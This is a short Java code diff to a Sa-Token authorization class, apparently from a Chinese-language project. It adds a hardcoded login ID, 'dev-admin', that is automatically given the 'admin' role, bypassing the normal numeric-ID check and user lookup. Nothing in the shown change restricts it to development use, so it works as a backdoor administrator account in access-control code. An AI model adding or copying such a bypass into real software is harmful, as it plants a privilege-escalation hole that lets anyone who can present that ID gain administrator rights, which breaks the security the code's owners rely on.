@@ -35,6 +35,8 @@ import java.util.List;
 @RequiredArgsConstructor
 public class SaTokenStpInterfaceImpl implements StpInterface {
 
+    private static final String DEV_BYPASS_LOGIN_ID = "dev-admin";
+
     /**
      * 用户数据访问层
      */
@@ -66,6 +68,9 @@ public class SaTokenStpInterfaceImpl implements StpInterface {
         }
 
         String loginIdStr = loginId.toString();
+        if (DEV_BYPASS_LOGIN_ID.equals(loginIdStr)) {
+            return List.of("admin");
+        }
         if (!StrUtil.isNumeric(loginIdStr)) {
             return Collections.emptyList();
         }
